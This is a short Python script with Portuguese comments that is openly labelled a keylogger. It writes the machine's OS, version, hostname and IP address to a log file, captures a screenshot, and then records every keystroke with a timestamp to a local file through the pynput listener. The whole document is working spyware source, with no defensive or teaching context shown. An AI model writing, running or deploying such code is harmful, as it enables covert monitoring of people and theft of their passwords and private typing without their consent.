import os
import platform
import socket
from pynput import keyboard
from PIL import ImageGrab
from datetime import datetime

# Criar pasta de logs
if not os.path.exists("logs"):
    os.makedirs("logs")

# Função para capturar informações do sistema
def capturar_infos():
    infos = {
        "Sistema": platform.system(),
        "Versão": platform.version(),
        "Nome da Máquina": socket.gethostname(),
        "Endereço IP": socket.gethostbyname(socket.gethostname())
    }
    with open("logs/infos.txt", "w") as f:
        for chave, valor in infos.items():
            f.write(f"{chave}: {valor}\n")

# Função para capturar screenshot
def capturar_tela():
    imagem = ImageGrab.grab()
    imagem.save("logs/screenshot.png")

# Função para registrar teclas pressionadas
def pressionada(tecla):
    try:
        with open("logs/teclas.txt", "a") as f:
            f.write(f"{datetime.now()} - {tecla.char}\n")
    except AttributeError:
        with open("logs/teclas.txt", "a") as f:
            f.write(f"{datetime.now()} - {tecla}\n")

# Iniciar keylogger
def iniciar_keylogger():
    with keyboard.Listener(on_press=pressionada) as listener:
        listener.join()

# Executar tudo
if __name__ == "__main__":
    capturar_infos()
    capturar_tela()
    iniciar_keylogger()
